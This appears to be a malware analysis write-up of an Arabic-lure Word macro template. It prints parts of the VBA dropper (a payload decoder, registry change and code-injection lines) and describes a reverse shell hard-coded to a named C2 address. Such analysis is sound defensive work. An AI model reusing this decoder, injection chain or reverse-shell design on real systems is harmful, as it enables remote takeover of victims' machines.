    Arabic Security-Training Lure Deploying a VBA Reverse Shell¶

    Introduction¶

    In May 2026, I stumbled upon a weaponised Microsoft Word macro-enabled template (.dotm, 33,966 bytes, SHA-256 e6cc542b690066cf6914e88199ce234236f2d929f313af8b0b2f8babe43d4f7d) that surfaced through one of the VirusTotal hunting rule. The template carries an Arabic-language lure themed as a peer-to-peer review request for a "third security training course", stored as an AutoText entry rather than in the visible document body.

    Exhibit 1: Lure Document

    Its VBA project, on Document_Open, decodes a letter-encoded ASCII-triplet payload from a UserForm TextBox and attempts to inject it as new VBA into the user's Normal.dotm global template through the Office object model. The stage-2 reverse shell connects to 51.38.87.253:25255 and bound an interactive cmd.exe to the socket on every Document_Close. The IP 51.38.87.253 has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure

    Lure Document Analysis¶

    The lure is a one-page Arabic-language course brochure for a six-day private-security training programme, framed as a draft schedule that the author wants reviewed before delivery. It opens with the Islamic Basmala, then lays out a table of topics, timings, learning outcomes, and target beneficiaries - running from 9 AM to noon daily - covering the duties and attributes of a security guard, security awareness, body language and threat recognition, search techniques, dealing with different segments of society, emergency response, watchtower and alarm operation, radio communications, conflict management, risk assessment, dress and standing posture, VIP protection, security report writing, and "the ethics of Islam in security work." The intended audience is named explicitly: security personnel generally, facility/company/shop guards, residential guards, and anyone interested in the subject. It closes with the signature of "Mr. Maytham Al-Uraimi" - a name with Omani/Emirati Gulf-region resonance - which, combined with the Arabic.dotm template and the otherwise mundane, professionally-framed content, makes it look like a piece of legitimate Gulf private-security training material that was either authored by or scraped from a real practitioner and then repurposed as a social-engineering wrapper.

    The sample is a Microsoft Word 2007+ macro-enabled template (.dotm), not a macro-enabled document (.docm). The [Content_Types].xml part-type override for word/document.xml is the canonical .dotm content type and the file's MIME identifier matches. Templates are loaded by Word into the global template chain at session start and run their VBA on Document_Open for any document derived from them, which makes the template-format choice operationally meaningful: the malicious VBA runs in a slightly different trust path from a regular .docm lure.

    Exhibit 2: Document Metadata

    The template's metadata reports Creator: Win10 (the Word-internal application-creator identifier left at a generic value, not a typed operator persona) and Last Modified By: Kristina Rowell.

    The metadata timestamps place the template's authoring window in February 2022, with a Create Date of 2022-02-06 12:21:00 UTC, a Modify Date of 2022-02-09 14:30:00 UTC, 13 recorded revisions, and a total edit time of one minute. The sample landed in the VirusTotal hunting queue in May 2026 and uploaded from Bangladesh, leaving a ~4-year gap between authoring and observed delivery. Either the operator is using a long-reused tooling artifact, or the metadata timestamps are spoofed, both are plausible.

    A second, stronger temporal signal is the ZIP archive's per-entry modification dates. Every one of the 20 OOXML parts inside the .dotm is timestamped 1980-01-01 00:00:00, the DOS-time epoch zero. Microsoft Word does not produce this — when Word saves a .dotm, each part receives a real Zip Modify Date. A uniform epoch-zero stamp across every entry means the OOXML container was re-packed by an external tool after Word built it, typically a Python zipfile.ZipInfo(..., date_time=(1980,1,1,0,0,0)) builder or a similar weaponisation helper. This is evidence of a build pipeline, not of an operator clicking "Save" in Word.

    Exhibit 3: ZIP Listing Showing all 20 Entries Pinned to 1980-01-01 00:00:00 - the File was Re-packaged Outside Word.

    VBA Project Analysis¶

    The VBA project (word/vbaProject.bin, 34,816 bytes) is the legacy OLE2 wrapper Office still uses for VBA inside OOXML. Static triage with oleid reports a high-risk VBA project with suspicious indicators.

    Exhibit 4: oleid Triage Output

    The OLE2 project contains ten streams across two code modules: VBA/ThisDocument (the dropper) and VBA/UserForm1 (a near-empty code-behind for the UserForm that holds the encoded payload). The oledump.py -i listing splits each M-flagged code stream into compiled p-code and compressed source; ThisDocument carries 4611 + 1630 bytes (p-code + source) and UserForm1 carries 1045 + 274.

    Macro Execution Chain¶

    Further analysis revealed that Document_Open is the only autoexec hook (vbaData.xml: <wne:eventDocOpen/>; project name TemplateProject). It sets view to wdPrintView, unprotects with the hard-coded password 20exlnt20, sets alreadyLaunched = True, and calls Launch. alreadyLaunched is never declared at module scope, so VBA gives each sub its own implicit procedure-local Variant; Launch's gating check fails against a fresh local and execution continues into SubstitutePage and Create_Word.

    SubstitutePage replaces the (empty) body with the AutoText entry Doc from the attached Arabic.dotm template and saves.

    Create_Word writes HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM = 1 to permit VBA self-modification, decodes the 16,392-character letter-encoded payload from UserForm1.TextBox1.Text via Putin (letter-to-digit substitution a → 0 … j → 9, then Chr(...) over each three-digit group; 5,464 bytes of VBA out), instantiates a hidden Word.Application (Visible = 0, DisplayAlerts = 0), creates a transient document via Documents.Add(""), and calls doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content)) to inject the decoded VBA into that transient document's ThisDocument module. It then closes the transient document with no SaveChanges (suppressed by DisplayAlerts = 0), quits the hidden app, and chains into unlink. The transient document never reaches disk; the stage-2 VBA does not survive Create_Word's return.

    unlink is the apparent persistence move and does not work as intended. It reassigns ActiveDocument.AttachedTemplate from Arabic.dotm to C:\Users\<UserName>\AppData\Roaming\Microsoft\Templates\Normal.dotm (resolved via Application.UserName), saves the lure, and closes it. This is a pointer change on the lure's attached-template property; it does not copy VBA code between projects, and Normal.dotm is not modified. DeleteVBAPROJECT (the component-wipe) is reachable only via unlink's On Error GoTo Destroy guard; on a clean execution Exit Sub returns first and the wipe never runs. The lure on disk ends up with its AttachedTemplate pointer redirected to Normal.dotm and its own VBA project intact.

    Net effect: AccessVBOM = 1, lure body replaced with the Arabic decoy, attached-template pointer moved to Normal.dotm, lure re-saved and closed. The stage-2 reverse shell is constructed but not persisted and not executed. The chain does not, as written, achieve the apparent operator intent; runtime confirmation would settle whether a Word internal quirk inherits the transient document's VBProject into Normal.dotm despite the discard.

Private Function Putin(i As String) As String
    Dim o As String
    i = Replace(i, "a", "0")
    i = Replace(i, "b", "1")
    i = Replace(i, "c", "2")
    i = Replace(i, "d", "3")
    i = Replace(i, "e", "4")
    i = Replace(i, "f", "5")
    i = Replace(i, "g", "6")
    i = Replace(i, "h", "7")
    i = Replace(i, "i", "8")
    i = Replace(i, "j", "9")
    For Counter = 1 To Len(i) Step 3
        o = o & Chr(Mid(i, Counter, 3))
    Next
    Putin = o
End Function

Sub DeleteVBAPROJECT()

            .VBComponents(i).CodeModule.DeleteLines _

    UserForm Payload Extraction and Decoding¶

    The stage-2 substrate lives in the UserForm1/o OLE stream of word/vbaProject.bin, 16,448 bytes long. This stream is not opaque binary - it is two concatenated MS-OFORMS TextProps records, each carrying one of the UserForm's variable-length property values. Walking the stream as (2-byte Version | 2-byte cbTextProps | Body) produces a clean partition: a 16,420-byte record at offset 0x0000 carrying the TextBox's Text property (the encoded payload), followed immediately by a 28-byte record at offset 0x4024 carrying the TextBox's FontName property (the string Tahoma). Total consumed: 16,420 + 28 = 16,448 bytes, the entire stream. The payload itself (a single contiguous block of [a-j] characters, 16,392 bytes long) sits inside the larger record's ExtraDataBlock, beginning at stream offset 0x001C and ending at 0x4024 immediately before the second record's header.

    Exhibit 7: xxd -l 64 /tmp/UserForm1_o.bin and xxd -s -64 /tmp/UserForm1_o.bin side-by-side, showing the OFORMS header 00 02 20 40 … at offset 0x00 resolving into the [a-j] payload at 0x1C, and the trailing TextProps record 00 02 18 00 … at 0x4024 containing the Tahoma font value.

    Decoding the payload statically reproduces what Putin would output at runtime. The longest [a-j] run is exactly 16,392 characters, divisible by 3, yielding 5,464 triplets with no out-of-range values. The first three triplets decode to 067 111 110 (C, o, n) and the last three to 083 117 098 (S, u, b); the recovered file therefore begins with Const ip = "51.38.87.253" and ends with End Sub, exactly the start and end of a complete VBA module. The decoded module is 5,464 bytes; its SHA-256 is 317f6f93fe81d1800cbbb1d8f8dbb7c7b27412358f3058f58a2496bae20f0863.

    Exhibit 8: Python decode harness output showing encoded len: 16392, decoded len: 5464, the SHA-256, first line Const ip = "51.38.87.253", and last line End Sub.

    Stage-2 Reverse-Shell Analysis¶

    The decoded VBA module is 145 lines of Winsock reverse-shell code. It declares four Win32 structures (WSADATA, ADDRINFO, STARTUPINFOA, PROCESS_INFORMATION), two enums for address families and socket types, and ten Private Declare PtrSafe API imports from ws2_32.dll (WSAStartup, WSACleanup, WSAGetLastError, WSASocketA, connect, closesocket, GetAddrInfo) and kernel32.dll (CopyMemory, ZeroMemory, and CreateProc aliased to CreateProcessA). The C2 endpoint is hard-coded as VBA string constants at the top of the module: ip = "51.38.87.253" and port = "25255".

    The revShell() function is the canonical Winsock-spawn-cmd reverse-shell pattern. It calls WSAStartup(MAKEWORD(2,2), ...) to initialise Winsock 2.2, resolves the C2 via GetAddrInfo with ai_family = AF_UNSPEC and ai_socktype = SOCK_STREAM, and walks the returned addrinfo linked list calling WSASocketA and connect for each node until one succeeds. Once connected, it zero-initialises a STARTUPINFOA, sets dwFlags = &H100 (STARTF_USESTDHANDLES), assigns the connected socket handle to hStdInput, hStdOutput, and hStdError, and calls CreateProc(vbNullString, "cmd", ByVal 0&, ByVal 0&, True, &H8000000, 0, vbNullString, si, pi). The combination of bInheritHandles = TRUE and CREATE_NO_WINDOW (0x08000000) binds cmd.exe's standard handles to the connected socket while suppressing the console window. This is a textbook Windows reverse-shell construction.

    Persistence¶

    The dropper's intended mechanism is template-poisoning of %APPDATA%\Microsoft\Templates\Normal.dotm such that an injected Document_Close() would fire on every Word-document close. The chain does not achieve this. Create_Word injects the stage-2 VBA into the VBProject of a transient document, then immediately discards it:

    Set doc = Wordy.Documents.Add("")             ' new transient document - its own VBProject
doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content))   ' code added to transient doc
doc.Close                                      ' transient doc discarded (DisplayAlerts=0 suppresses save prompt)

    Infrastructure and Attribution¶

    The sample itself was submitted to VirusTotal a single time, from Bangladesh, on 10-05-2026.

    The IP 51.38.87.253 has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure, but I have not independently verified this association from the sample alone (https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations).

    The Arabic security-training-course lure theme is compatible with APT42 / Charming Kitten targeting (Iranian-nexus actors have a documented history of operations against Arabic-speaking security and military entities across the Gulf, Iraq, Lebanon, and Syria), but theme alone does not constitute attribution.
